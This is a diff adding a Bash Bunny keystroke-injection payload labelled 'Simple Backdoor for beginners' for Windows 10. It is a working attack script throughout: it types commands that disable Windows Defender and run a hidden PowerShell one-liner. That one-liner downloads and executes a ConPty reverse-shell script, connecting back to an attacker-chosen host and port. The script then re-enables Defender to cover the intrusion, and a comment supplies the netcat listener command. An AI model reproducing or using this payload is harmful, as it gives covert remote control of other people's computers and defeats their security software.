@@ -1,1 +1,91 @@
+# Title:      
+# 			  Simple Backdoor for beginners
+# Description:      
+# 			  1) script deactivates Windows Defender
+# 			  2) script runs the powershell script
+# 			  3) script activates Windows Defender
+# Author:           RonjaMaja
+# Version:          1.0
+# Category:         Remote access
+# Target:           Microsoft Windows 10 (should work on Windows 11)
+# Attackmode:       HID
+# Credits to antonioCoco who wrote the powershell script
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+#
+# REQUIREMENTS
+# ===============
+# The target user must belong to the 'Administrators' group.
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. STAGE1
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+LED SETUP
+#replace layout with the keyboard layout you want to use | us by default | Example: DUCKY_LANG us |You can find other layouts on this page https://docs.hak5.org/bash-bunny/getting-started/installing-additional-languages
+DUCKY_LANG layout
 
+ATTACKMODE HID
+# replace rhost with the Target IP and rport with the port you want to use. I recommend SSH (22).
+
+
+# netcat command: stty raw -echo; (stty size; cat) | nc -lvnp rport rhost
+
+# replace lhost with your IP and lport with the port you want to use
+readonly lhost="192.168.1.1"
+readonly lport="22"
+
+LED STAGE1
+
+Q GUI r
+Q DELAY 500
+Q STRING "windowsdefender://ThreatSettings" # Deactivate windowsdefender
+Q DELAY 500
+Q ENTER
+Q DELAY 1500
+Q SPACE
+Q DELAY 1500
+Q SHIFT TAB
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q ALT F4
+
+
+LED STAGE2
+
+Q DELAY 1000
+
+Q GUI r                 #backdoor
+Q DELAY 500
+Q STRING "powerShell -W hidden IEX(IWR https://raw.githubusercontent.com/antonioCoco/conPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${lhost} ${lport}"
+Q DELAY 500
+Q CTRL SHIFT ENTER
+Q DELAY 1500
+Q LEFT
+Q DELAY 500
+Q ENTER
+
+LED STAGE3
+
+Q DELAY 1000
+
+Q GUI r
+Q DELAY 500
+Q STRING "windowsdefender://ThreatSettings" # Activate windowsdefender
+Q DELAY 500
+Q ENTER
+Q DELAY 1500
+Q SPACE
+Q DELAY 1500
+Q SHIFT TAB
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q ALT F4
+
+LED FINISH
